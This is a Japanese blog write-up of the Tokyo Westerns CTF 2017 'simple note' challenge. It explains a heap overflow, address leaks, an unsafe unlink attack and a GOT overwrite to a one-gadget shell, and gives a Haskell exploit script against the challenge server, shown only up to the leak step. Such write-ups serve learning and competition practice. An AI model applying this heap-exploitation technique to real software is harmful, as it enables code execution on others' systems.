<!DOCTYPE HTML><html lang="ja"><head><meta charset="utf-8"><meta content="Tosainu" name="author"><meta content="[Tokyo Westerns CTF 3rd 2017](https://ctftime.org/event/474) に1人チーム [poepoe](https://ctftime.org/team/32588) で参加してました。- Welcome!! (Misc 11)- [Just do " name="description"><meta content="Hakyll" name="generator"><meta content="width=device-width, initial-scale=1" name="viewport"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="myon___"><meta property="twitter:creator" content="myon___"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.myon.info/entry/2017/09/04/twctf-2017-writeups/index.html"><meta property="og:title" content="Tokyo Westerns CTF 3rd 2017: simple note | Tosainu Lab"><meta property="og:description" content="[Tokyo Westerns CTF 3rd 2017](https://ctftime.org/event/474) に1人チーム [poepoe](https://ctftime.org/team/32588) で参加してました。- Welcome!! (Misc 11)- [Just do "><meta property="og:site_name" content="Tosainu Lab"><meta property="og:image" content="https://blog.myon.info/images/icon/cocoa-512.jpg"><title>Tokyo Westerns CTF 3rd 2017: simple note | Tosainu Lab</title><link href="/vendor/normalize.css/normalize.css" rel="stylesheet"><link href="/stylesheets/style.css" rel="stylesheet"><link href="/stylesheets/highlight.css" rel="stylesheet"><link href="/vendor/fontawesome/style.css" rel="stylesheet"><link href="/vendor/katex/katex.min.css" rel="stylesheet"><link href="/feed.xml" title="Atom Feed" type="application/atom+xml" rel="alternate"><script async src="https://www.googletagmanager.com/gtag/js?id=G-X1CGBSMEQW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-X1CGBSMEQW');</script></head><body><header class="site-header"><div class="container"><h1><a href="/" title="home">Tosainu Lab</a></h1></div></header><main class="post"><article><header class="post-header"><div class="container"><h1><a href="/entry/2017/09/04/twctf-2017-writeups/">Tokyo Westerns CTF 3rd 2017: simple note</a></h1><ul class="post-meta"><li><svg class="svg-inline--fa fa-calendar" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="calendar" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M96 32V64H48C21.5 64 0 85.5 0 112v48H448V112c0-26.5-21.5-48-48-48H352V32c0-17.7-14.3-32-32-32s-32 14.3-32 32V64H160V32c0-17.7-14.3-32-32-32S96 14.3 96 32zM448 192H0V464c0 26.5 21.5 48 48 48H400c26.5 0 48-21.5 48-48V192z" fill="currentColor"></path></svg></li><li class="date">2017/09/04 23:51</li><li><svg class="svg-inline--fa fa-tags" focusable="false" aria-hidden="true" role="img" viewBox="0 0 512 512" data-icon="tags" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M345 39.1L472.8 168.4c52.4 53 52.4 138.2 0 191.2L360.8 472.9c-9.3 9.4-24.5 9.5-33.9 .2s-9.5-24.5-.2-33.9L438.6 325.9c33.9-34.3 33.9-89.4 0-123.7L310.9 72.9c-9.3-9.4-9.2-24.6 .2-33.9s24.6-9.2 33.9 .2zM0 229.5V80C0 53.5 21.5 32 48 32H197.5c17 0 33.3 6.7 45.3 18.7l168 168c25 25 25 65.5 0 90.5L277.3 442.7c-25 25-65.5 25-90.5 0l-168-168C6.7 262.7 0 246.5 0 229.5zM144 144c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32z" fill="currentColor"></path></svg></li><li><ul class="tag-list"><li><a href="/entry/tags/ctf/"><span>CTF</span></a></li></ul></li></ul></div></header><div class="container"><div class="post-contents"><p><a href="https://ctftime.org/event/474" target="_blank" rel="nofollow noopener">Tokyo Westerns CTF 3rd 2017</a> に1人チーム <a href="https://ctftime.org/team/32588" target="_blank" rel="nofollow noopener">poepoe</a> で参加してました。</p>
<ul>
<li>Welcome!! (Misc 11)</li>
<li><a href="https://gist.github.com/db8dd0373c0a411333423d75ad53d7e7" target="_blank" rel="nofollow noopener">Just do it! (Pwn 23)</a></li>
<li><a href="https://gist.github.com/b9e72a87ee5a1e4b1cb89ce256019470" target="_blank" rel="nofollow noopener">Palindromes Pairs - Coding Phase - (PPC 24)</a></li>
<li><a href="https://gist.github.com/4930863a73f04c593771043ea966f27e" target="_blank" rel="nofollow noopener">Rev Rev Rev (Reverse 25)</a></li>
<li>simple note (Pwn 86)</li>
</ul>
<p>の 169 pts で 161 位。</p>
<p>simple note 解けたのがすごく嬉しかった。<br />
とはいえ時間掛けすぎているので、もう少しサクッと解けるようにしていきたいところ。</p>
<!--more-->
<h2 id="simple-note-pwn-86">simple note <small>(Pwn 86)</small></h2>
<p>x86-64 の ELF。libc 配布有り。</p>
<pre><code>$ file simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b 
simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9976eff277e9b1fef5ebe60277ea7eb90a17625e, not stripped

$ checksec -f simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes	0		2simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b</code></pre>
<p>タイトルの通り、よくあるノート管理する系のやつ。</p>
<pre><code>$ ./simple_note-b5bdfa5fdb0fb070867ac0298a0b2a850f22e712513038d92c24c40664fac56b 
======================
1. add a new note
2. delete the note
3. show the note
4. edit the note
5. exit
======================
Your choice: </code></pre>
<p>主な機能はこんな感じ。</p>
<ol type="1">
<li>add a new note
<ul>
<li>指定されたサイズ (<code>size &gt; 0x7f</code>) の領域を<code>malloc</code>で確保する</li>
<li>領域のアドレスを配列<code>list</code>の空いているところに格納する</li>
<li>確保した領域に<code>read</code>で指定されたサイズ分読み込む</li>
</ul></li>
<li>delete the note
<ul>
<li>指定された領域を<code>free</code>する</li>
<li>対応する<code>list</code>の要素を<code>NULL</code>にする</li>
</ul></li>
<li>show the note
<ul>
<li>指定された領域を<strong><code>puts</code>で表示する</strong></li>
</ul></li>
<li>edit the note
<ul>
<li>指定された領域に<strong><code>strlen</code>の返した文字数分<code>read</code>で上書きする</strong></li>
</ul></li>
</ol>
<p>“4. edit the note” で<code>strlen</code>した文字数も読めるので、バッファを全て埋めておけば<strong>隣のチャンクの<code>size</code>が書き換え可能</strong>になる。これを利用し、<code>free</code>済みチャンクの<code>size</code>書き換え ➡ unsafe unlink attack ➡ GOT overwrite という感じで解いた。</p>
<h3 id="アドレスのリーク">アドレスのリーク</h3>
<p>まず4つの領域を確保し (buffer 0~3、そのチャンクを chunk 0~3 とする)、buffer 2、buffer 0 の順で解放するとこんな感じになる。</p>
<pre><code> main_arena   +-----------------------------------------+
|          |  |  +--------------------+                 |
|    top   |&lt;-+  |                    |                 |
|          |  |  |  +-chunk 0---+     |  +-chunk 2---+  |
|  bins[0] |-----|-&gt;| prev_size |&lt;-+  +-&gt;| prev_size |  |
|  bins[1] |-----+  | size      |  |  |  | size      |  |
|          |  |     | fd        |-----+  | fd        |--+
|          |  +-----| bk        |  +-----| bk        |
|          |        +-----------+        +-----------+</code></pre>
<p>この状態で同じサイズの領域を2つ<code>malloc</code>すると、chunk 2、chunk 0 の順で返される。ここで、<code>malloc</code>が返すアドレスはチャンクの<code>fd</code>に相当し、また<code>fd</code>や<code>bk</code>の値は<code>malloc</code>が返すときにクリアされるわけではないので、リークさせることが可能である。最終的な攻撃スクリプトでは、新たに確保する領域に 8 bytes の文字列を書き込み、続く<code>bk</code>の値を読むことで heap および libc のアドレスを求めた。</p>
<p><code>main_arena</code>のシンボルはエクスポートされていないので、配布された libc からオフセットを求めるのは少し苦戦した。今回は <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l4686" target="_blank" rel="nofollow noopener"><code>__libc_mallinfo</code></a> のように<code>main_arena</code>のアドレスを参照している関数のディスアセンブル結果を見ることで求めたけど、もっといい感じの方法とかあったりするのだろうか…</p>
<pre><code>$ r2 -A libc.so.6-4cd1a422a9aafcdcb1931ac8c47336384554727f57a02c59806053a4693f1c71
[0x00020950]&gt; s sym.__libc_mallinfo 
[0x00086e70]&gt; pdf
            ;-- mallinfo:
┌ (fcn) sym.__libc_mallinfo 279
│   sym.__libc_mallinfo ();
│           ; var int local_8h @ rsp+0x8
│           ; var int local_10h @ rsp+0x10
│           ; var int local_18h @ rsp+0x18
│           ; var int local_20h @ rsp+0x20
│           0x00086e70      4156           push r14
│           0x00086e72      4155           push r13
│           0x00086e74      4989fe         mov r14, rdi
│           0x00086e77      4154           push r12
│           0x00086e79      55             push rbp
│           0x00086e7a      53             push rbx
│           0x00086e7b      4883ec30       sub rsp, 0x30               ; &#39;0&#39;
│           0x00086e7f      8b05bfd23300   mov eax, dword [0x003c4144] ; [0x3c4144:4]=-1
│           0x00086e85      85c0           test eax, eax
│       ┌─&lt; 0x00086e87      0f88f3000000   js 0x86f80
│       │      ; JMP XREF from 0x00086f85 (sym.__libc_mallinfo)
│      ┌──&gt; 0x00086e8d      488d2d8cdc33.  lea rbp, qword 0x003c4b20    ; &lt;- main_arena!!
│      |│   0x00086e94      48c704240000.  mov qword [rsp], 0
│      |│   0x00086e9c      48c744240800.  mov qword [local_8h], 0
│      |│   0x00086ea5      48c744241000.  mov qword [local_10h], 0
...</code></pre>
<h3 id="unsafe-unlink-attack">unsafe unlink attack</h3>
<p>glibc は、よく知られた unlink attack を<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=d20d5955db4d814b73a5b1829d1bc7874c94024d;hb=ab30899d880f9741a409cbc0d7a28399bdac21bf#l1414" target="_blank" rel="nofollow noopener">こんな感じのチェック</a>をすることで防いでいる。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">/* Take a chunk off a bin list */</span></span>
<span id="cb5-2"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define unlink(AV, P, BK, FD) {                                            \</span></span>
<span id="cb5-3"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="pp">    FD = P-&gt;fd;								      \</span></span>
<span id="cb5-4"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="pp">    BK = P-&gt;bk;								      \</span></span>
<span id="cb5-5"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="pp">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span>
<span id="cb5-6"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="pp">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span></span>
<span id="cb5-7"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="pp">...</span></span></code></pre></div>
<p>しかし、ある解放済みチャンク<code>P</code>の<code>fd</code>、<code>bk</code>が書き換え可能であり、かつアドレスが推測可能な領域<code>X</code>が<code>P</code>を指しているとき、</p>
<ul>
<li><code>P-&gt;fd = X - 0x18</code></li>
<li><code>P-&gt;bk = X - 0x10</code></li>
</ul>
<p>とすることで、このチェックを回避できる<a href="/entry/2017/09/04/twctf-2017-writeups/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。これを unsafe unlink attack というらしい。</p>
<p>さて、今回のプログラムは確保した領域を配列<code>list</code>で管理している。なんとかして<code>list</code>を書き換えることができれば、任意のアドレスの書き換えが可能になる。<br />
そこでまず、<code>list</code>の要素が<strong>チャンクの先頭を指す</strong>ような状況を作り出す。3つの領域 (0x88, 0xf8, 0x88 bytes、buffer 4~6 とする) を確保し、buffer 5 を解放しておく。</p>
<figure>
<img src="/entry/2017/09/04/twctf-2017-writeups/1.svg" alt="heap1" />
<figcaption aria-hidden="true">heap1</figcaption>
</figure>
<p>この状態で buffer 4 から 0x88 + 1 bytes 書き込み、chunk 5 の<code>size</code>を 0x101 から 0x1f1 に書き換える。</p>
<figure>
<img src="/entry/2017/09/04/twctf-2017-writeups/2.svg" alt="heap2" />
<figcaption aria-hidden="true">heap2</figcaption>
</figure>
<p>そのあと2つの領域 (0x108, 0x88 bytes、buffer 5, 7 とする) を確保すると、<code>size</code>を偽装したチャンクが切り分けられ、こんな感じになる。このとき、<strong>buffer 6 を指している<code>list[6]</code>が chunk 7 の先頭も指すことになる</strong>。</p>
<figure>
<img src="/entry/2017/09/04/twctf-2017-writeups/3.svg" alt="heap3" />
<figcaption aria-hidden="true">heap3</figcaption>
</figure>
<p>こうしてできた buffer 5 と buffer 7 を使って、unsafe unlink attack を行う。今回のプログラムでは解放済みの領域に書き込むことは難しいので、chunk 7 の<code>fd</code>、<code>bk</code>をセットし、さらに後ろのチャンクの<code>PREV_INUSE</code>ビットをクリアして解放されたことにする。</p>
<figure>
<img src="/entry/2017/09/04/twctf-2017-writeups/4.svg" alt="heap3" />
<figcaption aria-hidden="true">heap3</figcaption>
</figure>
<p>このあと buffer 5 の解放をすると、<code>list[6]</code>が<code>list[3]</code>を指すようになる。</p>
<p>この状態から buffer 6 に書き込むつもりで<code>list[3]</code>を<code>puts</code>の GOT に書き換え、続けて buffer 3 に書き込むつもりで<code>puts</code>の GOT を one-gadget RCE に向けることでシェルを取ることができた。</p>
<h3 id="exploit">exploit!</h3>
<p>最終的なスクリプトと実行結果は次の通り。</p>
<p>問題サーバの libc (Ubuntu 16.04) ではチャンクの<code>size</code>と隣のチャンクの<code>prev_size</code>が一致するかのチェックをしていて刺さらなかったので、ダミーの<code>prev_size</code>を書き込む処理も追加している。(この関係で一部のインデックスが変わっている)<br />
僕には glibc のソースから該当する部分を見つけられなかったのだけど、どこにあるのだろう?</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb6-1"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#!/usr/bin/env stack</span></span>
<span id="cb6-2"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">-- stack --stack-yaml ./stack.yaml runghc --package pwn</span></span>
<span id="cb6-3"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-4"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ot">{-# LANGUAGE OverloadedStrings #-}</span></span>
<span id="cb6-5"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-6"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Control.Monad</span></span>
<span id="cb6-7"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Bits</span></span>
<span id="cb6-8"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span> <span class="kw">qualified</span> <span class="dt">Data.ByteString.Char8</span> <span class="kw">as</span> <span class="dt">BS</span></span>
<span id="cb6-9"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Maybe</span></span>
<span id="cb6-10"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Data.Monoid</span>           ((&lt;&gt;))</span>
<span id="cb6-11"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Numeric</span>               (showHex)</span>
<span id="cb6-12"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-13"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="co">-- https://github.com/Tosainu/pwn.hs</span></span>
<span id="cb6-14"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Pwn</span></span>
<span id="cb6-15"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-16"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="ot">showByteString ::</span> (<span class="dt">Show</span> a) <span class="ot">=&gt;</span> a <span class="ot">-&gt;</span> <span class="dt">BS.ByteString</span></span>
<span id="cb6-17"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-17" aria-hidden="true" tabindex="-1"></a>showByteString <span class="ot">=</span> BS.pack <span class="op">.</span> <span class="fu">show</span></span>
<span id="cb6-18"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-19"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb6-20"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-20" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-21"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-21" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- r &lt;- remote &quot;192.168.122.10&quot; 4000</span></span>
<span id="cb6-22"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-22" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- let libc_main_arena&#39; = 0x3a5620</span></span>
<span id="cb6-23"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-23" aria-hidden="true" tabindex="-1"></a>  <span class="co">--     libc_one_gadget&#39; = 0x41374</span></span>
<span id="cb6-24"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-25"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-25" aria-hidden="true" tabindex="-1"></a>  <span class="co">-- r &lt;- remote &quot;172.17.0.2&quot; 4000</span></span>
<span id="cb6-26"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-26" aria-hidden="true" tabindex="-1"></a>  r <span class="ot">&lt;-</span> remote <span class="st">&quot;pwn1.chal.ctf.westerns.tokyo&quot;</span> <span class="dv">16317</span></span>
<span id="cb6-27"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-27" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> libc_main_arena&#39; <span class="ot">=</span> <span class="bn">0x003c4b20</span></span>
<span id="cb6-28"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-28" aria-hidden="true" tabindex="-1"></a>      libc_one_gadget&#39; <span class="ot">=</span> <span class="bn">0x4526a</span></span>
<span id="cb6-29"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-30"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-30" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> list      <span class="ot">=</span> <span class="bn">0x006020c0</span></span>
<span id="cb6-31"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-32"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-32" aria-hidden="true" tabindex="-1"></a>      puts_got  <span class="ot">=</span> <span class="bn">0x00602020</span></span>
<span id="cb6-33"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-34"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-34" aria-hidden="true" tabindex="-1"></a>      addNote size str <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-35"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-35" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-36"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-36" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;1&quot;</span></span>
<span id="cb6-37"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-37" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the size: \n&quot;</span></span>
<span id="cb6-38"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-38" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString size</span>
<span id="cb6-39"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-39" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input your note: \n&quot;</span></span>
<span id="cb6-40"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-40" aria-hidden="true" tabindex="-1"></a>        send r str</span>
<span id="cb6-41"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-42"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-42" aria-hidden="true" tabindex="-1"></a>      deleteNote idx <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-43"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-43" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-44"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-44" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;2&quot;</span></span>
<span id="cb6-45"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-45" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-46"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-46" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-47"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-48"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-48" aria-hidden="true" tabindex="-1"></a>      showNote idx <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-49"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-49" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-50"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-50" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;3&quot;</span></span>
<span id="cb6-51"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-51" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-52"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-52" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-53"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-53" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Note: \n&quot;</span></span>
<span id="cb6-54"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-54" aria-hidden="true" tabindex="-1"></a>        buf <span class="ot">&lt;-</span> recvuntil r <span class="st">&quot;\n====&quot;</span></span>
<span id="cb6-55"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-55" aria-hidden="true" tabindex="-1"></a>        <span class="fu">return</span> <span class="op">$</span> BS.take (BS.length buf <span class="op">-</span> BS.length <span class="st">&quot;\n====&quot;</span>) buf</span>
<span id="cb6-56"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-56" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-57"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-57" aria-hidden="true" tabindex="-1"></a>      editNote idx str <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-58"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-58" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-59"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-59" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;4&quot;</span></span>
<span id="cb6-60"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-60" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input the index: \n&quot;</span></span>
<span id="cb6-61"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-61" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="op">$</span> showByteString idx</span>
<span id="cb6-62"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-62" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Please input your note: \n&quot;</span></span>
<span id="cb6-63"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-63" aria-hidden="true" tabindex="-1"></a>        send r str</span>
<span id="cb6-64"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-65"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-65" aria-hidden="true" tabindex="-1"></a>      exit <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-66"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-66" aria-hidden="true" tabindex="-1"></a>        recvuntil r <span class="st">&quot;Your choice: \n&quot;</span></span>
<span id="cb6-67"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-67" aria-hidden="true" tabindex="-1"></a>        sendline r <span class="st">&quot;5&quot;</span></span>
<span id="cb6-68"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-68" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-69"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-69" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate 0x88 bytes buffer x4 (buffer 0..3)&quot;</span></span>
<span id="cb6-70"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-70" aria-hidden="true" tabindex="-1"></a>  replicateM_ <span class="dv">4</span> <span class="op">$</span> addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="bn">0x88</span> <span class="ch">&#39;A&#39;</span></span>
<span id="cb6-71"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-71" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-72"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-72" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;free buffer 2 and buffer 0&quot;</span></span>
<span id="cb6-73"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-73" aria-hidden="true" tabindex="-1"></a>  <span class="fu">mapM_</span> deleteNote [<span class="dv">2</span>, <span class="dv">0</span>]</span>
<span id="cb6-74"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-74" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-75"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-75" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;allocate 0x88 bytes buffer x2 (buffer 0, buffer 2)&quot;</span></span>
<span id="cb6-76"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-76" aria-hidden="true" tabindex="-1"></a>  addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="dv">9</span> <span class="ch">&#39;a&#39;</span></span>
<span id="cb6-77"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-77" aria-hidden="true" tabindex="-1"></a>  addNote <span class="bn">0x88</span> <span class="op">$</span> BS.replicate <span class="dv">8</span> <span class="ch">&#39;b&#39;</span></span>
<span id="cb6-78"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-78" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-79"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-79" aria-hidden="true" tabindex="-1"></a>  info <span class="st">&quot;leak informations&quot;</span></span>
<span id="cb6-80"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-80" aria-hidden="true" tabindex="-1"></a>  leak1 <span class="ot">&lt;-</span> BS.drop <span class="dv">8</span> <span class="op">&lt;$&gt;</span> showNote <span class="dv">0</span></span>
<span id="cb6-81"><a href="/entry/2017/09/04/twctf-2017-writeups/#cb6-81" aria-hidden="true" tabindex="-1"></a>  leak2 <span class="ot">&lt;-</span> BS.drop <span class="dv">8</span> <span class="op">&lt;$&gt;</span> showNote <span class="dv">2</span></span>
